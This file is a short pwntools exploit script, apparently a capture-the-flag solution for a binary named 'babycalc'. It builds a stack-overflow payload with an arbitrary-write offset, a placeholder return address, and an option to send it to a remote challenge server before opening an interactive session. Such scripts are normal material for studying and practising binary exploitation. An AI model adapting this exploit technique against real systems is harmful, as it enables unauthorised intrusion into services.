from pwn import *

context.log_level = 'debug'
context.os = 'linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

elf = ELF('./babycalc')
#libc = ELF('./libc.so.6')

debug = 1

if debug:
    io = process('./babycalc')
else:
    io = remote('39.102.55.191',9999)

def p():
    gdb.attach(proc.pidof(io)[0])

io.recvuntil(b"number-")

payload = b'\x31\x31' #0x0a的ascii任意地址写的内容

rop = b'a' * (0x8 * 0xd * 2 - 8 - 2)
rop += p64(0xdeadbeef)
payload += rop

numbers = b"\x13\x24\x35\x46\x37\x42\x11\xa1\x32\x83\xd4\x65\x76\xc7\x18\x03"
payload += numbers

payload += b'b' * 0x8 * 3 + b'c' * 4
payload += p32(0x39) # 控制任意地址写的地址偏移
p()
io.send(payload)

io.recvuntil(b"number-")
#p()
io.send(payload)

io.interactive()
